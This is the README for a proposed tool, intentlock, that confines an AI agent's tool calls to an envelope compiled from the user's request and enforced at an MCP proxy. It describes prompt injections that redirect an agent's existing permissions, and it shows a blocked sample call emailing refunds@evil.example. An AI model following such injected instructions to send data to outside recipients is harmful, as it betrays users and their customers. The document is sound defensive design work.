# intentlock

Tool calls limited to what the user actually asked for. At the start of a
task, `intentlock` turns the user's request into a capability envelope: the
tools the agent may call, the argument values they may take, and the
recipients and paths they may touch. An MCP proxy enforces the envelope, so a
prompt injection that tries to widen the task is blocked before the call runs.

> **Status: design stage.** There is no code yet. The envelope format,
> commands and output below are the proposal, and they will change. Part of
> the [OpenAstra](https://openastra.org) research agenda, area VIII: AI
> Runtime Security.

## The problem

Agents get standing permissions: a support agent can refund *any* order and
email *anyone*, because some task might need it. A prompt injection doesn't
need new permissions; it only needs to redirect the ones the agent already
has. Static allowlists can't help, because the right scope depends on the
request in front of the agent right now.

## How it works

1. **Capture intent.** When a task starts, take the user's request (not
   content the agent later reads) as the source of truth.
2. **Compile an envelope.** Derive the allowed tools and argument constraints.
   Simple requests compile with rules; ambiguous ones are shown to the user to
   confirm. Example: "Refund order #4411" becomes
   `refund(order_id = 4411, amount <= original_amount)`.
3. **Enforce at the proxy.** `intentlock` sits between the agent and its MCP
   servers. Every call is checked against the envelope: allowed, blocked, or
   held for approval.
4. **Widen explicitly.** If the agent genuinely needs more, it asks, and the
   user approves a new envelope. Content the agent read can never widen it.

## Example (proposed)

```yaml
# envelope compiled from: "Refund order #4411 and let the customer know"
task: t-81c2
allow:
  - tool: orders.refund
    args: { order_id: 4411, amount: { max: $order.4411.total } }
  - tool: email.send
    args: { to: $order.4411.customer_email, max_count: 1 }
deny_by_default: true
```

```console
BLOCKED  email.send(to="refunds@evil.example")
         recipient is outside the envelope for task t-81c2
         envelope allows: customer of order 4411
```

## Planned surfaces

- MCP proxy (stdio and HTTP) that wraps existing servers with no changes to them
- Envelope compiler: rules first, with an optional model-assisted mode that always asks the user to confirm
- Policy hooks in [OpenGPL](https://github.com/sadayamuthu/opengpl), so organizations can set limits no envelope may exceed
- Audit log of every envelope, call and decision

## Maps to

| Framework | Items |
|-----------|-------|
| OWASP LLM Top 10 (2025) | LLM01 Prompt Injection, LLM06 Excessive Agency |
| OWASP Agentic Top 10 | Goal hijack, tool misuse |
| NIST SP 800-53 Rev. 5 | AC-3 Access Enforcement, AC-6 Least Privilege |

## Design principles

- **The user's words set the scope; retrieved content never does.**
- **Deny by default** inside an envelope.
- **Fail closed** when the envelope can't be compiled: ask, don't guess.

## Roadmap

1. Envelope schema and the rule-based compiler
2. MCP proxy with enforcement and audit log
3. Approval flow for widening
4. OpenGPL policy ceilings
5. Model-assisted compilation for open-ended requests

## Related OpenAstra projects

- [Unasked](https://github.com/sadayamuthu/unasked): the same idea after the fact, for code edits
- [Taintline](https://github.com/sadayamuthu/taintline): tracks *which content* is trying to make a call
- AgentID (in the lab): the identity an envelope is issued to

## License

To be decided before the first release.
